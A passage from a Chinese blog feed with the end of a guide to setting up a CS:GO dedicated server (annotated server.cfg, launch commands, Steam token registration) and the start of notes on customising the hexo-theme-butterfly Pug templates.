class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line">rcon_password <span class="string">&quot;&quot;</span> <span class="comment">// OP 密码</span></span><br><span class="line"><span class="comment">// &quot;&quot; 表示没有</span></span><br><span class="line">hostname <span class="string">&quot;服务器&quot;</span></span><br><span class="line"><span class="comment">// 服务器名称</span></span><br><span class="line">sv_region <span class="number">255</span> <span class="comment">// 服务器所在区域注册参数</span></span><br><span class="line"><span class="comment">// 255=全球</span></span><br><span class="line"><span class="comment">// 0=美国东部</span></span><br><span class="line"><span class="comment">// 1=美国西部</span></span><br><span class="line"><span class="comment">// 2=南美洲</span></span><br><span class="line"><span class="comment">// 3=欧洲</span></span><br><span class="line"><span class="comment">// 4=亚洲</span></span><br><span class="line"><span class="comment">// 5=澳洲</span></span><br><span class="line"><span class="comment">// 6=中东</span></span><br><span class="line"><span class="comment">// 7=非洲</span></span><br><span class="line">sv_rcon_minfailures <span class="number">3</span></span><br><span class="line"><span class="comment">// 允许输入OP密码 错误次数下限 // 达到下限则封禁对方的IP</span></span><br><span class="line">sv_rcon_banpenalty <span class="number">5</span></span><br><span class="line"><span class="comment">// 封禁的时限 单位 分钟</span></span><br><span class="line"><span class="comment">// 0=永久</span></span><br><span class="line">sv_maxupdaterate <span class="number">100</span></span><br><span class="line"><span class="comment">// 服务器每秒更新最大频率</span></span><br><span class="line"><span class="comment">// 根据实际网络状况调节</span></span><br><span class="line"><span class="comment">// sv_maxrate / 300 = 要设的值 // 默认=30</span></span><br><span class="line"><span class="comment">// 局域网=101</span></span><br><span class="line">sv_minupdaterate <span class="number">40</span></span><br><span class="line"><span class="comment">// 服务器每秒更新最小频率</span></span><br><span class="line">sv_unlag <span class="number">1</span></span><br><span class="line"><span class="comment">// 玩家延时补偿</span></span><br><span class="line"><span class="comment">// 0=关闭</span></span><br><span class="line"><span class="comment">// 1=开启(默认)</span></span><br><span class="line">sv_maxunlag <span class="number">0.5</span> <span class="comment">// 延时补偿最大值默认 0.5 // 0.5=500毫秒(默认)</span></span><br><span class="line">sv_voiceenable <span class="number">1</span> <span class="comment">// 服务器是否允许麦克风语音通讯 // 0=禁止</span></span><br><span class="line"><span class="comment">// 1=允许(默认)</span></span><br><span class="line">sv_unlagsamples <span class="number">1</span> <span class="comment">// 延时补偿数据包平均采样数量 // 默认=1</span></span><br><span class="line">sv_unlagpush <span class="number">0</span> <span class="comment">// 服务器推进延时补偿</span></span><br><span class="line"><span class="comment">// 0=关闭(默认)</span></span><br><span class="line"><span class="comment">// 1=开启</span></span><br><span class="line">mp_autokick <span class="number">0</span> <span class="comment">// 自动踢除不动的玩家</span></span><br><span class="line"><span class="comment">// 0=关闭(比赛默认)</span></span><br><span class="line"><span class="comment">// 1=开启</span></span><br><span class="line">mp_autocrosshair <span class="number">0</span> <span class="comment">// 自动瞄准</span></span><br><span class="line"><span class="comment">// 0=关闭(默认)</span></span><br><span class="line"><span class="comment">// 1=开启</span></span><br><span class="line">mp_autoteambalance <span class="number">0</span></span><br><span class="line"><span class="comment">// 自动平衡双方人数</span></span><br><span class="line"><span class="comment">// 0=关闭(比赛默认)</span></span><br><span class="line"><span class="comment">// 1=开启</span></span><br><span class="line">mp_buytime <span class="number">0.25</span> <span class="comment">// 每回合购买武器装备时间单位分钟 // 比赛默认=0.25</span></span><br><span class="line">mp_consistency <span class="number">1</span> <span class="comment">// 防止某些模型被更改</span></span><br><span class="line"><span class="comment">// 0=关闭</span></span><br><span class="line"><span class="comment">// 1=开启(默认)</span></span><br><span class="line">mp_c4timer <span class="number">35</span> <span class="comment">// C4爆炸倒计时单位秒</span></span><br><span class="line"><span class="comment">// 比赛默认=35</span></span><br><span class="line">mp_decals <span class="number">300</span> <span class="comment">// 墙壁上的血花弹孔贴图细节数据传送(200-300)</span></span><br><span class="line">mp_falldamage <span class="number">1</span> <span class="comment">// 高处落下伤害</span></span><br><span class="line"><span class="comment">// 0=关闭</span></span><br><span class="line"><span class="comment">// 1=开启(默认)</span></span><br><span class="line">mp_fadetoblack <span class="number">0</span> <span class="comment">// 死后黑屏</span></span><br><span class="line"><span class="comment">// 0=关闭(默认)</span></span><br><span class="line"><span class="comment">// 1=开启</span></span><br><span class="line">mp_flashlight <span class="number">1</span> <span class="comment">// 手电筒</span></span><br><span class="line"><span class="comment">// 0=禁止</span></span><br><span class="line"><span class="comment">// 1=允许(默认)</span></span><br><span class="line">mp_forcechasecam <span class="number">2</span> <span class="comment">// 死后跟随</span></span><br><span class="line"><span class="comment">// 0=所有玩家</span></span><br><span class="line"><span class="comment">// 1=仅队友</span></span><br><span class="line"><span class="comment">// 2=仅队友，主视角(比赛默认)</span></span><br><span class="line">mp_forcecamera <span class="number">2</span> <span class="comment">// 死后视角选择</span></span><br><span class="line"><span class="comment">// 0=全部视角</span></span><br><span class="line"><span class="comment">// 1=仅队友，全部视角</span></span><br><span class="line"><span class="comment">// 2=仅队友，主视角(比赛默认)</span></span><br><span class="line">mp_footsteps <span class="number">1</span> <span class="comment">// 脚步声</span></span><br><span class="line"><span class="comment">// 0=关闭</span></span><br><span class="line"><span class="comment">// 1=开启(默认)</span></span><br><span class="line">mp_fraglimit <span class="number">0</span> <span class="comment">//杀人数上限(1~n)，超过上限就换地图 // 0=关闭(默认)</span></span><br><span class="line">mp_freezetime <span class="number">8</span> <span class="comment">// 每回合开始冻结时间单位秒</span></span><br><span class="line">mp_friendlyfire <span class="number">1</span> <span class="comment">// 友军伤害</span></span><br><span class="line"><span class="comment">// 0=关闭(默认)</span></span><br><span class="line"><span class="comment">// 1=开启</span></span><br><span class="line">mp_friendly_grenade_damage <span class="number">1</span></span><br><span class="line"><span class="comment">// 友军手雷伤害</span></span><br><span class="line"><span class="comment">// 0=关闭</span></span><br><span class="line"><span class="comment">// 1=开启</span></span><br><span class="line">mp_hostagepenalty <span class="number">0</span> <span class="comment">// 惩罚人质杀手</span></span><br><span class="line"><span class="comment">// 0=不惩罚(默认)</span></span><br><span class="line"><span class="comment">// 1~N=人质被杀数量，超过则踢出该玩家</span></span><br><span class="line">mp_limitteams <span class="number">0</span> <span class="comment">// 两队人数差异上限</span></span><br><span class="line"><span class="comment">// 超过此上限，新玩家只能当观察员 // 比赛默认=10</span></span><br><span class="line">sv_logbans <span class="number">1</span></span><br><span class="line"><span class="comment">// 服务器日志里记录Ban掉玩家的内容 // 0=不记录</span></span><br><span class="line"><span class="comment">// 1=记录</span></span><br><span class="line">mp_logecho <span class="number">0</span> <span class="comment">// 将服务器日志反馈到控制台 // 0=关闭</span></span><br><span class="line"><span class="comment">// 1=开启</span></span><br><span class="line">mp_logdetail <span class="number">3</span> <span class="comment">// 服务器日志里记录攻击信息 // 0=不记录任何信息</span></span><br><span class="line"><span class="comment">// 1=记录敌人攻击</span></span><br><span class="line"><span class="comment">// 2=记录队友攻击</span></span><br><span class="line"><span class="comment">// 3=记录所有攻击</span></span><br><span class="line">mp_logfile <span class="number">1</span> <span class="comment">// 服务器记录日志为文件 // 0=不记录</span></span><br><span class="line"><span class="comment">// 1=记录</span></span><br><span class="line">mp_logmessages <span class="number">1</span> <span class="comment">// 服务器日志里记录谈话内容 // 0=不记录</span></span><br><span class="line"><span class="comment">// 1=记录</span></span><br><span class="line">mp_maxrounds <span class="number">30</span> <span class="comment">// 回合上限，达到此上限，自动重新载入新地图</span></span><br><span class="line"><span class="comment">// 0=无回合上限(默认)</span></span><br><span class="line">mp_playerid <span class="number">0</span> <span class="comment">// 当准星指向敌人或队友时，显示他们的名字</span></span><br><span class="line"><span class="comment">// 0=显示所有人(比赛默认)</span></span><br><span class="line"><span class="comment">// 1=仅显示队友</span></span><br><span class="line"><span class="comment">// 2=不显示</span></span><br><span class="line">mp_roundtime <span class="number">2</span></span><br><span class="line"><span class="comment">// 每回合时限单位分钟</span></span><br><span class="line">mp_timelimit <span class="number">0</span></span><br><span class="line"><span class="comment">// 地图最大时限，达此时限，自动重新载入新地图</span></span><br><span class="line"><span class="comment">// 0=无时限</span></span><br><span class="line">mp_tkpunish <span class="number">0</span></span><br><span class="line"><span class="comment">// 惩罚队友杀手</span></span><br><span class="line"><span class="comment">// 0=关闭(默认)</span></span><br><span class="line"><span class="comment">// 1=开启</span></span><br><span class="line">mp_startmoney <span class="number">800</span> <span class="comment">// 第一回合开始金钱(800~16000) // 加时赛=10000</span></span><br><span class="line">mp_winlimit <span class="number">0</span></span><br><span class="line"><span class="comment">// 一方最大胜利回合数，达到此数量，自动重新载入新地图</span></span><br><span class="line"><span class="comment">// 0=无限制(默认)</span></span><br><span class="line">sv_aim <span class="number">0</span></span><br><span class="line"><span class="comment">// 自动瞄准</span></span><br><span class="line"><span class="comment">// 0=关闭(默认)</span></span><br><span class="line"><span class="comment">// 1=开启</span></span><br><span class="line">sv_airaccelerate <span class="number">10</span> <span class="comment">// 玩家在空中移动的速度</span></span><br><span class="line"><span class="comment">// 默认=10</span></span><br><span class="line">sv_airmove <span class="number">1</span> <span class="comment">// 在空中移动&amp;转向</span></span><br><span class="line"><span class="comment">// 0=禁止</span></span><br><span class="line"><span class="comment">// 1=允许(默认)</span></span><br><span class="line">sv_allowdownload <span class="number">1</span></span><br><span class="line"><span class="comment">// 客户端下载服务器资源 // 0=禁止</span></span><br><span class="line"><span class="comment">// 1=允许(默认)</span></span><br><span class="line">sv_allowupload <span class="number">1</span></span><br><span class="line"><span class="comment">// 客户端上传自己的喷图 // 0=禁止</span></span><br><span class="line"><span class="comment">// 1=允许(默认)</span></span><br><span class="line">sv_alltalk <span class="number">1</span> <span class="comment">// 警匪通话</span></span><br><span class="line"><span class="comment">// 0=禁止(默认)</span></span><br><span class="line"><span class="comment">// 1=允许</span></span><br><span class="line">sv_proxies <span class="number">1</span> <span class="comment">// HLTV代理</span></span><br><span class="line"><span class="comment">// 0=禁止</span></span><br><span class="line"><span class="comment">// 1=允许(默认)</span></span><br><span class="line">sv_cheats <span class="number">0</span> <span class="comment">// 作弊模式</span></span><br><span class="line"><span class="comment">// 0=关闭(默认)</span></span><br><span class="line"><span class="comment">// 1=开启</span></span><br><span class="line">sv_clienttrace <span class="number">1.0</span> <span class="comment">// 客户端模型的范围框的尺寸</span></span><br><span class="line"><span class="comment">// 默认 1.0</span></span><br><span class="line">sv_clipmode <span class="number">0</span></span><br><span class="line"><span class="comment">// 锁定客户端快速模式</span></span><br><span class="line"><span class="comment">// 0=关闭(默认)</span></span><br><span class="line"><span class="comment">// 1=开启</span></span><br><span class="line">sv_friction <span class="number">4</span></span><br><span class="line"><span class="comment">// 地面摩擦力默认 4</span></span><br><span class="line"><span class="comment">// 数值越低，摩擦越小</span></span><br><span class="line">sv_gravity <span class="number">800</span> <span class="comment">// 重力默认 800</span></span><br><span class="line">sv_maxrate <span class="number">20000</span> <span class="comment">// 服务器最大传输速率&lt;0-25000&gt; // (服务器上传带宽 x 125) /服务器设定的最大人数 = 要设的值</span></span><br><span class="line"><span class="comment">// 0=无限制</span></span><br><span class="line"><span class="comment">// 局域网=25000</span></span><br><span class="line">sv_maxspeed <span class="number">320</span> <span class="comment">// 客户端最大移动速度</span></span><br><span class="line">sv_minrate <span class="number">0</span></span><br><span class="line"><span class="comment">// 服务器最小传输速率&lt;0-25000&gt; // 0=无限制</span></span><br><span class="line">sv_send_logos <span class="number">1</span> <span class="comment">// 客户端相互之间传送喷图</span></span><br><span class="line"><span class="comment">// 0=禁止</span></span><br><span class="line"><span class="comment">// 1=允许(同时确保sv_allowdownload键值为1)</span></span><br><span class="line">sv_sendvelocity <span class="number">0</span></span><br><span class="line"><span class="comment">// 服务器混合物理运算，适用于较好配置的服务器 // 0=关闭</span></span><br><span class="line"><span class="comment">// 1=开启</span></span><br><span class="line">sv_send_resources <span class="number">1</span></span><br><span class="line"><span class="comment">// 自动向客户端传送地图关联的*.res文件里包括的资源文件 // 0=关闭</span></span><br><span class="line"><span class="comment">// 1=开启(同时确保sv_allowdownload为1)</span></span><br><span class="line">sv_stepsize <span class="number">18</span></span><br><span class="line"><span class="comment">// 玩家的步伐距离</span></span><br><span class="line"><span class="comment">// 默认 18</span></span><br><span class="line">sv_stopspeed <span class="number">75</span></span><br><span class="line"><span class="comment">// 玩家停止移动时的速度默认 75</span></span><br><span class="line">sv_timeout <span class="number">65</span></span><br><span class="line"><span class="comment">// 客户端连接服务器超时的时限，达到时限则断开连接</span></span><br><span class="line">sv_voicecodec voice_speex <span class="comment">// 语音通话解码</span></span><br><span class="line"><span class="comment">// voice_miles是HL引擎长期以来用的语音解码(默认)，占用带宽较大，为32kbps</span></span><br><span class="line"><span class="comment">// voice_speex是Valve新加入的解码，优于voice_miles，占用带宽较少，为2.4kbps至15.2kbps</span></span><br><span class="line">sv_voicequality <span class="number">5</span></span><br><span class="line"><span class="comment">// 客户端语音通话质量(确保sv_voicecodec voice_speex)</span></span><br><span class="line"><span class="comment">// 1=非常差...........占用带宽 2.4 kbps // 2=差...............占用带宽 6.0 kbps // 3=中等.............占用带宽 8.0 kbps // 4=好...............占用带宽 11.2 kbps // 5=非常清晰.........占用带宽 15.2 kbps</span></span><br><span class="line">allow_spectators <span class="number">1</span></span><br><span class="line"><span class="comment">// 观察员模式</span></span><br><span class="line"><span class="comment">// 0=禁止</span></span><br><span class="line"><span class="comment">// 1=允许</span></span><br><span class="line">decalfrequency <span class="number">30</span></span><br><span class="line"><span class="comment">// 玩家喷图的时间间隔单位秒</span></span><br><span class="line">edgefriction <span class="number">2</span></span><br><span class="line"><span class="comment">// 玩家与玩家、墙壁、物体之间的摩擦</span></span><br><span class="line"><span class="comment">// 默认 2</span></span><br><span class="line">host_framerate <span class="number">0</span></span><br><span class="line"><span class="comment">// 与Demo录制有关</span></span><br><span class="line"><span class="comment">// 0&lt;N&lt;1 为慢录</span></span><br><span class="line"><span class="comment">// n=0 为正常(默认)</span></span><br><span class="line"><span class="comment">// n&gt;1 为快录</span></span><br><span class="line">log on</span><br><span class="line"><span class="comment">// 开始记录日志</span></span><br><span class="line">pausable <span class="number">1</span></span><br><span class="line"><span class="comment">// 客户端暂停游戏</span></span><br><span class="line"><span class="comment">// 0=禁止</span></span><br><span class="line"><span class="comment">// 1=允许</span></span><br><span class="line"><span class="comment">// Steam社区服务器验证</span></span><br><span class="line">sv_setsteamaccount xxx</span><br><span class="line"><span class="comment">// 模式参数</span></span><br><span class="line">game_mode <span class="number">1</span></span><br><span class="line">game_type <span class="number">0</span></span><br><span class="line">mapcyclefile mapcycle.<span class="property">txt</span></span><br><span class="line"><span class="comment">// 地图循环列表所在的.txt文件</span></span><br><span class="line"><span class="comment">// *.txt = cstrike\*.txt文件</span></span><br><span class="line"><span class="comment">// Use this file to configure your DEDICATED server. // This config file is executed on server start.</span></span><br><span class="line"><span class="comment">// load ban files</span></span><br><span class="line">exec listip.<span class="property">cfg</span></span><br><span class="line">exec banned.<span class="property">cfg</span></span><br></pre></td></tr></table></figure><p>其中很多内容我都注释好了，其实这个配置文件也是我从网上找来然后进行修改得出的。其中有几个比较重要的参数：</p><p><code>rcon_password</code>管理员密码，在控制台可以输入密码使用管理员权限，就不需要在后台使用指令</p><p><code>hostname</code>服务器名称，记得一定要修改，之前翻社区服务器的时候发现很多没修改的都是写着Counter-Strike Global Offensive的</p><p><code>sv_password</code>玩家加入需要的密码，填入了就会加密你的服务器，只有输入正确的密码才能够进入</p><p><code>sv_setsteamaccount</code>社区服注册秘钥，这个一会会说</p><p>调整完了你的配置文件，将文件命名为<code>server.cfg</code>，然后放入上面所说的那个<code>./csgo/cfg</code>文件夹中即可</p><p>接着我们就可以着手开启服务器了</p><h4 id="开启服务器"><a href="#开启服务器" class="headerlink" title="开启服务器"></a>开启服务器</h4><p>关于服务器的开启，根据Steam的官方文档，我们需要安装一个叫做<code>screen</code>的包，使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yum install screen</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install screen</span><br></pre></td></tr></table></figure><p>来安装，然后我们就进入到CSGO服务器文件夹的根目录，也就是<code>./steamapps/common/Counter-Strike Global Offensive Beta - Dedicated Server</code>里面，使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ screen ./srcds_run</span><br></pre></td></tr></table></figure><p>就可以开启服务器了，当然后面可以跟一些参数，例如我想关闭VAC验证（避免<code>VAC无法验证您的回话</code>出现而无法加入服务器），那我就在后面加上<code>-insecure</code>即可；或者说我想更改模式，我就可以使用<code>+game_mode 1 +game_type 0</code>来进入竞技模式。</p><p>等到最后一行提示<code>GC Connection established for server version xxxx, instance idx 1</code>的时候就是开完了（xxxx是版本号）</p><div class="note warning flat"><p>根据<a href="mailto:&#x43;&#x53;&#68;&#78;&#64;&#83;&#117;&#109;&#109;&#101;&#x72;&#46;&#76;&#73;&#x43;&#89;">&#x43;&#x53;&#68;&#78;&#64;&#83;&#117;&#109;&#109;&#101;&#x72;&#46;&#76;&#73;&#x43;&#89;</a>的反馈，启动时可能会出现<code>Failed to open dedicated.so (libstdc++.so.6: cannot open shared object file: No such file or directory)</code>的情况，这种情况下我们需要使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install libstdc++.so.6</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yum install libstdc++.so.6</span><br></pre></td></tr></table></figure><p>来安装这个依赖库</p></div><p>关于模式，这里有一份较详细的表格（来源：Steam Developers官网）</p><table class="standard-table"><tbody><tr><th> Game Mode</th><th> game_type</th><th> game_mode</th></tr><tr><td> Casual (default)</td><td> 0</td><td> 0</td></tr><tr><td> Competitive / Scrimmage</td><td> 0</td><td> 1</td></tr><tr><td> Wingman</td><td> 0</td><td> 2</td></tr><tr><td> Arms Race</td><td> 1</td><td> 0</td></tr><tr><td> Demolition</td><td> 1</td><td> 1</td></tr><tr><td> Deathmatch</td><td> 1</td><td> 2</td></tr><tr><td> Custom</td><td> 3</td><td> any (?)</td></tr><tr><td> Guardian</td><td> 4</td><td> 0</td></tr><tr><td> Co-op Strike</td><td> 4</td><td> 1</td></tr><tr><td> Danger Zone</td><td> 6</td><td> 0</td></tr></tbody></table><h4 id="注册服务器"><a href="#注册服务器" class="headerlink" title="注册服务器"></a>注册服务器</h4><p>当你直接开启服务器后，用<code>connect ip:27015</code>进行连接会提示：仅限局域网连接，这就是没有注册服务器到社区服务器造成的结果。这就需要用到我刚刚所说的<code>sv_setsteamaccount</code>这个配置。</p><p>我们访问<a href="https://steamcommunity.com/dev/managegameservers">Steam 社区 :: Steam 游戏服务器帐户管理</a>这个链接，在这里登陆你的Steam账号（一定要没有VAC记录和社区违规记录！！！否则会无法注册）</p><p>官方Steam账号要求</p><ul><li>您的 Steam 帐户目前不能处于社区封禁或锁定状态。</li><li>您的 Steam 帐户不能<a href="https://support.steampowered.com/kb_article.php?ref=3330-IAGK-7663">受限</a>。</li><li>您的 Steam 帐户必须拥有一个[合格的注册手机](<a href="https://support.steampowered.com/kb_article.php?ref=8625-WRAH-9030&amp;l=simplified">https://support.steampowered.com/kb_article.php?ref=8625-WRAH-9030&amp;l=simplified</a> chinese)。</li><li>您的 Steam 帐户必须拥有所创建游戏服务器对应的游戏。</li><li>您的 Steam 帐户可以创建 1000 个游戏服务器帐户。</li></ul><p>然后我们在下面的APPID里面填入<code>730</code>，备忘录按照自己喜好填，主要是用来区分不同的秘钥使用</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@CSGO/img/CSGO-Server/community-server-reg.png" alt="CSGO社区服务器注册"></p><p>然后将获得的秘钥放入<code>sv_setsteamaccount</code>内即可，接着启动服务器，连接服务器，发现是不是可以连接了？</p><h3 id="Windows搭建方法"><a href="#Windows搭建方法" class="headerlink" title="Windows搭建方法"></a>Windows搭建方法</h3><p>其实Windows除了Steamcmd的安装跟linux不一样，其他都是一样的。Windows版的Steamcmd可以在这里下载<a href="https://steamcdn-a.akamaihd.net/client/installer/steamcmd.zip">https://steamcdn-a.akamaihd.net/client/installer/steamcmd.zip</a></p><p>下载完后解压，通过命令行运行steamcmd，其余的方法都跟linux一样，可以从<a href="#CSGO%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85">CSGO服务器安装</a>开始看</p><hr><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>我打CSGO是真的菜，讲真……而且CSGO开箱真的开不起，我还是做一名咸鱼玩家吧</p><p>不过话说回来我CSGO有狗牌（忠诚徽章）耶，应该是我唯一能炫耀的东西惹……</p><p>辣鸡腾讯，QQ里面拦截我的网站，申诉还说我有恶意信息……一会加客服QQ问</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-theme-butterfly主题美化小笔记</title>
      <link href="/posts/butterfly-customize/"/>
      <url>/posts/butterfly-customize/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note info flat"><p>在正式讲博客的美化之前，我想先感谢<a href="https://jerryc.me/">@jerryc</a>能够带来这么棒的主题~如果你同样想使用butterfly主题，你可以去查看<a href="https://jerryc.me/posts/21cfbf15/">安装文档</a></p></div><div class="note warning flat"><p>如果你想让我在butterfly中添加新功能，你可以直接在本文章下方留言，我会尽量满足</p><p>另：</p></div><p>话不多说，让我们开始吧！</p><p><strong>注：写这篇文章的时候我的主题版本是2.1.0</strong></p><hr><h3 id="友链界面加入更多的自定义文字"><a href="#友链界面加入更多的自定义文字" class="headerlink" title="友链界面加入更多的自定义文字"></a>友链界面加入更多的自定义文字</h3><div class="note warning flat"><h4 id="x42-117-116-116-x65-114-x66-108-x79-x40-50-x2e-50-46-x30-以后此方法不再适用！"><a href="#x42-117-116-116-x65-114-x66-108-x79-x40-50-x2e-50-46-x30-以后此方法不再适用！" class="headerlink" title="&#x42;&#117;&#116;&#116;&#x65;&#114;&#x66;&#108;&#x79;&#x40;&#50;&#x2e;&#50;&#46;&#x30;以后此方法不再适用！"></a><a href="mailto:&#x42;&#117;&#116;&#116;&#x65;&#114;&#x66;&#108;&#x79;&#x40;&#50;&#x2e;&#50;&#46;&#x30;">&#x42;&#117;&#116;&#116;&#x65;&#114;&#x66;&#108;&#x79;&#x40;&#50;&#x2e;&#50;&#46;&#x30;</a>以后此方法不再适用！</h4><p>详情请看<a href="https://github.com/jerryc127/hexo-theme-butterfly/releases/tag/2.2.0">https://github.com/jerryc127/hexo-theme-butterfly/releases/tag/2.2.0</a></p></div><p>关于友链界面，我加入了很多内容，如<code>A Few Requirements</code>和下面的<code>PS</code>就是我加入的。</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@butterfly-customize/img/butterfly-customize/Link-text.png" alt="更多的内容"></p><p>之前闲着没事翻了一下主题的<code>layout</code>文件夹，里面的文件都已经命好名了，所以说一看我就知道哪个文件对应哪个部分，而我需要修改的就是<code>flink.pug</code>这个文件</p><p>原来它长这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.flink</span><br><span class="line">  each i in site.data.link</span><br><span class="line">    h1= i.class_name</span><br><span class="line">    .post-cards</span><br><span class="line">      ul.md-links</span><br><span class="line">        each item in i.link_list</span><br><span class="line">          li.md-links-item</span><br><span class="line">            a(href=item.link  title=item.name target=&quot;_blank&quot;)</span><br><span class="line">              if theme.lazyload.enable</span><br><span class="line">                img.lazyload(data-src=item.avatar onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.lodding_bg.flink) + `&#x27;` alt=item.name )</span><br><span class="line">              else</span><br><span class="line">                img(src=item.avatar onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.lodding_bg.flink) + `&#x27;` alt=item.name )</span><br><span class="line">              .md-links-title= item.name </span><br><span class="line">              .md-links-des= item.descr</span><br><span class="line"></span><br><span class="line">  hr</span><br><span class="line">  div </span><br><span class="line">    h2= theme.Flink.info_headline</span><br><span class="line">    ul</span><br><span class="line">      li= theme.Flink.name</span><br><span class="line">      li= theme.Flink.address</span><br><span class="line">      li= theme.Flink.avatar </span><br><span class="line">      li= theme.Flink.info</span><br><span class="line"></span><br><span class="line">  hr</span><br><span class="line">  .comment_int</span><br><span class="line">    p.comment-word= theme.Flink.comment</span><br></pre></td></tr></table></figure><p>尽管我不是很懂pug这个东西，但是我还是能看懂代码的内容，其中<code>hr</code>就是一条分割线，所以说区块就用分割线来分开就好了。</p><p>最开始使用这个主题的时候（当时版本应该是1.2.0，还没有按钮分级），在做友链界面的时候，我这边就有人对我的数字提出了疑问，然后我就加入了下面那行<code>PS：本文所有的数字表示方式来自Mili - world.execute(me);</code></p><p>在<code>flink.pug</code>中加入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p(style=&quot;font-size:9px;font-weight:bold&quot;)= theme.Flink.PS</span><br></pre></td></tr></table></figure><p>然后在butterfly的配置文件中加入一行</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">PS:</span> <span class="string">PS：本文所有的数字表示方式来自Mili</span> <span class="bullet">-</span> <span class="string">world.execute(me);</span> <span class="comment"># PS内容，在flink自加的</span></span><br></pre></td></tr></table></figure><p>就可以在友链界面加入自定义的内容了</p><p>至于<code>A Few Requirements</code>区块在更新2.1.0后用同样的方式加入的</p><p>在<code>flink.pug</code>加入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hr</span><br><span class="line">div </span><br><span class="line">  h2= theme.Flink.require_headline</span><br><span class="line">  ul</span><br><span class="line">    li= theme.Flink.requirement1</span><br><span class="line">    li= theme.Flink.requirement2</span><br><span class="line">    li= theme.Flink.requirement3</span><br><span class="line">    li= theme.Flink.requirement4</span><br><span class="line">    li= 